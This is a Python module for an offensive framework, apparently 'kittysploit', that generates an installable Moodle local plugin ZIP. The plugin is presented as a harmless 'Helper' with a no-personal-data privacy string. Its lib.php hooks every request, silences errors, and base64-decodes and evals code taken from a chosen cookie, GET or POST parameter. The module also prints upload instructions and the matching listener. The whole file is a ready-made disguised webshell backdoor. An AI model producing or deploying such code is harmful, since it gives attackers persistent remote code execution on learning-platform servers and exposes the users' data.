from kittysploit import *
import os
import re
import zipfile


class Module(Backdoor):

	__info__ = {
		'name': 'Moodle Webshell Plugin',
		'description': (
			'Generate a Moodle local plugin webshell that can be installed under '
			'local/ and activated from Site administration > Plugins'
		),
		'author': 'KittySploit Team',
		'listener': 'listeners/web/php_cookie',
		'session_type': SessionType.PHP,
		'arch': Arch.PHP,
	}

	plugin_name = OptString(
		"kittyhelper",
		"Local plugin short name (letters/digits only; becomes local_<name>)",
		True,
	)
	param_name = OptString("kitty_shell", "Cookie/GET/POST parameter name for shell", True)
	method = OptChoice(
		"cookie",
		"Backdoor activation method",
		False,
		choices=["cookie", "get", "post"],
	)
	moodle_requires = OptString(
		"2022041900",
		"Minimum Moodle version (YYYYMMDDXX) required by the plugin",
		False,
	)

	def _sanitize_plugin_name(self) -> str:
		name = re.sub(r"[^a-z0-9_]", "", str(self.plugin_name).lower())
		if not name or not name[0].isalpha():
			name = "kittyhelper"
		return name

	def _backdoor_snippet(self) -> str:
		param = self.param_name
		if self.method == "cookie":
			source = f"$_COOKIE['{param}']"
		elif self.method == "get":
			source = f"$_GET['{param}']"
		else:
			source = f"$_POST['{param}']"
		return f"""
	if (isset({source})) {{
		$data = {source};
		$decoded = @base64_decode($data);
		if ($decoded !== false) {{
			@eval($decoded);
		}}
	}}"""

	def run(self):
		short_name = self._sanitize_plugin_name()
		component = f"local_{short_name}"
		# Moodle install ZIP root must be the short plugin name (placed under local/).
		plugin_root = short_name
		version = "2026010100"

		version_php = f"""<?php
defined('MOODLE_INTERNAL') || die();

$plugin->component = '{component}';
$plugin->version   = {version};
$plugin->requires  = {self.moodle_requires};
$plugin->maturity  = MATURITY_STABLE;
$plugin->release   = '1.0.0';
"""

		lang_php = f"""<?php
defined('MOODLE_INTERNAL') || die();

$string['pluginname'] = '{short_name.title()} Helper';
$string['privacy:metadata'] = 'The {short_name.title()} Helper plugin does not store any personal data.';
"""

		# after_config is invoked from setup.php for every request once the plugin is installed.
		lib_php = f"""<?php
defined('MOODLE_INTERNAL') || die();

/**
 * Early request hook used by the helper plugin.
 */
function {component}_after_config() {{
	@error_reporting(0);
{self._backdoor_snippet()}
}}
"""

		files = {
			f"{plugin_root}/version.php": version_php,
			f"{plugin_root}/lib.php": lib_php,
			f"{plugin_root}/lang/en/{component}.php": lang_php,
		}
		for rel_path, content in files.items():
			self.write_out_dir(rel_path, content)

		output_dir = os.path.join(os.getcwd(), "output")
		zip_path = os.path.join(output_dir, f"{component}.zip")

		with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
			for rel_path in files:
				abs_path = os.path.join(output_dir, rel_path)
				if os.path.exists(abs_path):
					zipf.write(abs_path, arcname=rel_path)

		print_success(f"Moodle webshell plugin generated: {zip_path}")
		print_info(f"Component: {component} (install path: local/{short_name}/)")
		print_info(f"Method: {self.method} / parameter: {self.param_name}")
		print_info(
			"Install: Site administration > Plugins > Install plugins "
			f"(upload {os.path.basename(zip_path)}), or extract into Moodle's local/{short_name}/"
		)
		print_info(f"Listener: use listeners/web/php_{self.method} matching param '{self.param_name}'")
		return True
